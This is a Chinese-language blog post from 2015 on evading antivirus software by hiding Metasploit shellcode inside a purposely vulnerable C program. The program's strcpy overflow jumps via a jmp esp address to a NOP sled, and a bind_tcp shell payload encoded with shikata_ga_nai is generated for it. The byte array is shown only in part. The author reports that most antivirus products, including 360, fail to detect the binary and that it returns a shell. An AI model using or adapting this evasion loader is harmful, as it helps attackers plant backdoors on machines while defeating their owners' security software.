<!DOCTYPE html>
<html lang="zh-cn">
    <head>
        <meta charset="utf-8" />
        <meta name="robots" content="index,follow" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="author" content="Chu" />
        <meta name="description" content="Chu 的博客" />
        <meta name="keywords" content="Chu,网络安全,编程开发" />

        <title>通过溢出漏洞绕过杀毒防护 - Chu&#39;s BLoG</title>

        
		
		
        <link rel="stylesheet" href="/css/main.5d65992f9b793fc8ef4d51468c16f848fbe23ebfca8a5cd9508abf8cc4389cc7.css" integrity="sha256-XWWZL5t5P8jvTVFGjBb4SPviPr/KilzZUIq/jMQ4nMc=" />
        <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
    </head>

    <body>
        <header></header>
        <main>
<article>
    <header>
        <h1>通过溢出漏洞绕过杀毒防护</h1>
        <div>
            <time datetime="2015-09-03 18:45:43 +0800 CST">发布时间: 2015-09-03 18:45</time>
            <time datetime="2015-09-03 18:45:43 +0800 CST">更新时间: 2015-09-03 18:45</time>
        </div>
    </header>

    <section>
    <h2 id="思路">思路</h2>
<p>通过编写一具有溢出漏洞的程序，并将恶意代码写入 shellcode 中，溢出后执行 shellcode 可以绕过杀毒软件的防护。</p>
<h2 id="测试环境">测试环境</h2>
<ul>
<li>Platform：Windows XP SP3</li>
<li>Compiler：VC 6.0</li>
</ul>
<h2 id="测试代码">测试代码</h2>
<p>构造如下漏洞代码加载 shellcode：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">overflow</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> input)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">strcpy</span>(buf, input);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAAAAAA&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7b\x46\x86\x7c</span><span style="color:#e6db74">&#34;</span>			<span style="color:#75715e">//jmp esp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;shellcode&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">overflow</span>(shellcode);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>首先，通过 msfpayload 生成一 payload，进行查杀，发现大部分杀毒都会报毒：</p>
<p><img src="bypass-av-with-exploit-1.png" alt=""></p>
<p>生成 shellcode，并填入源码中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msf &gt; use payload/windows/shell/bind_tcp
</span></span><span style="display:flex;"><span>msf payload<span style="color:#f92672">(</span>bind_tcp<span style="color:#f92672">)</span> &gt; generate -b <span style="color:#e6db74">&#39;\x00&#39;</span> -t c
</span></span><span style="display:flex;"><span>/*
</span></span><span style="display:flex;"><span> * windows/shell/bind_tcp - <span style="color:#ae81ff">312</span> bytes <span style="color:#f92672">(</span>stage 1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> * http://www.metasploit.com
</span></span><span style="display:flex;"><span> * Encoder: x86/shikata_ga_nai
</span></span><span style="display:flex;"><span> * VERBOSE<span style="color:#f92672">=</span>false, LPORT<span style="color:#f92672">=</span>4444, RHOST<span style="color:#f92672">=</span>,
</span></span><span style="display:flex;"><span> * PayloadUUIDTracking<span style="color:#f92672">=</span>false, EnableStageEncoding<span style="color:#f92672">=</span>false,
</span></span><span style="display:flex;"><span> * StageEncoderSaveRegisters<span style="color:#f92672">=</span>, StageEncodingFallback<span style="color:#f92672">=</span>true,
</span></span><span style="display:flex;"><span> * PrependMigrate<span style="color:#f92672">=</span>false, EXITFUNC<span style="color:#f92672">=</span>none, InitialAutoRunScript<span style="color:#f92672">=</span>,
</span></span><span style="display:flex;"><span> * AutoRunScript<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span> */
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbd\x81\xf6\x2c\x43\xd9\xe9\xd9\x74\x24\xf4\x58\x31\xc9\xb1&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x83\xc0\x04\x31\x68\x0f\x03\x68\x8e\x14\xd9\xbf\x78\x5a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x22\x40\x78\x3b\xaa\xa5\x49\x7b\xc8\xae\xf9\x4b\x9a\xe3\xf5&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x20\xce\x17\x8e\x45\xc7\x18\x27\xe3\x31\x16\xb8\x58\x01\x39&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>···
</span></span></code></pre></div><p>编译后发现成功绕过绝大多数杀毒软件：</p>
<p><img src="bypass-av-with-exploit-2.png" alt=""></p>
<p>成功返回 shell（test with 360）：</p>
<p><img src="bypass-av-with-exploit-3.png" alt=""></p>
<p><img src="bypass-av-with-exploit-4.png" alt=""></p>
<h2 id="其他">其他</h2>
<p>@糖果师傅说这个思路在 02 年的时候就已经被提出来个，但是不知道为什么还是可以用，估计原因是杀毒软件还是偏向于静态查杀？</p>
<p>附 2002 年 Xcon 上的相关资料：<a href="http://www.xfocus.net/projects/Xcon/2002/Xcon2002_flashsky.pdf">溢出植入型木马（后门）的原型实现</a></p>

    </section>
</article>
</main>
    </body>
</html>
